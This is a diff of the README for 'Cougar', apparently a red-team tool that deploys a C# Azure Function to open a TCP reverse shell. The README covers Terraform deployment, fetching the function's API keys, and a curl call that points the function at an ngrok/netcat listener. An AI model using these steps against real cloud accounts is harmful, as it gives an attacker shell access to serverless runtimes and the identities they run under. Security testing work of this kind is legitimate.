@@ -8,56 +8,38 @@ Cougar is a C# function that can be deployed to the Azure to establish a TCP rev
 * [Azure CLI](https://github.com/Azure/azure-cli)
 * [Terraform](https://learn.hashicorp.com/terraform/getting-started/install.html)
 
-## Deploying the Function
-
-### Native Deployment
-
-Requires the Resource Group, Function App (.NET Core, Linux OS), App Service Plan, App Insights, and Storage Account to be created in US West.
+### Terraform Deployment
 
 ```bash
-func azure functionapp publish pumapreycougar
-```
-
-Then, enable the function identity to use an MSI account during execution.
-
-### Terraform
-
-```bash
-cd src
-dotnet publish
-cd ../terraform
-terraform init
-export TF_VAR_UniqueString=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.
-
-# Optional: Use a Windows runtime (defaults to Linux).
-export TF_VAR_AppServicePlanKind=Windows
-
 az login
-terraform apply
+export TF_VAR_unique_identifier=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.
+cd cougar/src/terraform/
+terraform init
+terraform apply --auto-approve
 ```
 
 ## Function Testing
 
 Retrieve the Function Id, Host, and API key via the CLI.
 
-```
+```bash
 export COUGAR_FUNCTION_ID=$(terraform output --json | jq -r '.cougar_function_id.value')
 export COUGAR_FUNCTION_HOST=$(terraform output --json | jq -r '.cougar_function_host.value')
 export COUGAR_API_KEY=$(az rest --method post --uri "$COUGAR_FUNCTION_ID/host/default/listKeys?api-version=2018-11-01" | jq -r .functionKeys.default)
-export COUGAR_FUNCTION_URL=http://$COUGAR_FUNCTION_HOST/api/Cougar
+export COUGAR_FUNCTION_URL="https://$COUGAR_FUNCTION_HOST/api/Cougar"
 curl "$COUGAR_FUNCTION_URL?code=$COUGAR_API_KEY"
 ```
 
-The result should show an error message indicating required parameters are missing:
+The result should show an error message indicating required C2 parameters are missing:
 
-```
-{"message":"Must provide the host and port for the target TCP server as query parameters."}%
+```json
+{"message":"Must provide the host and port for the target TCP server as query parameters."}
 ```
 
 If you have [Netcat](http://netcat.sourceforge.net/) and [ngrok](https://ngrok.com/) installed, you can use this script:
 
 ```bash
-script/cougar --url-id "cougar$TF_VAR_UniqueString" --api-key YOUR_API_KEY
+../../../script/prey.sh cougar --url $COUGAR_FUNCTION_URL --api-key $COUGAR_API_KEY
 ```
 
 See [here](../script/USAGE.md) for more details on how to use this script.
@@ -77,7 +59,7 @@ ngrok tcp 4444
 Finally, invoke your function, supplying your connection details and API key:
 
 ```bash
-curl "https://cougar$TF_VAR_UniqueString.azurewebsites.net/api/Cougar?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER&code=YOUR_API_KEY"
+curl "$COUGAR_FUNCTION_URL?code=$COUGAR_API_KEY&host=NGROK_PORT_IP&port=NGROK_PORT_NUMBER"
 ```
 
 Your listener will now act as a reverse shell for the duration of the function invocation.
@@ -88,30 +70,6 @@ Your listener will now act as a reverse shell for the duration of the function i
 terraform destroy
 ```
 
-## Running Locally
-
-Install [Azure Functions Core Tools](https://docs.microsoft.com/en-us/azure/azure-functions/functions-run-local) and run the following:
-
-```bash
-cd src
-dotnet restore
-dotnet build
-func start
-```
-
-## Testing Locally
-
-```bash
-curl 'http://localhost:7071/api/Cougar?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER'
-```
-
 ## Learning More
 
 Read [documentation](docs) on what you can accomplish once you connect to the runtime via Cougar.
-
-## Azure Function C# Template
-
-```bash
-func init Cougar --csharp --dotnet
-func new --template "HTTP trigger" --name GetCougar
-```
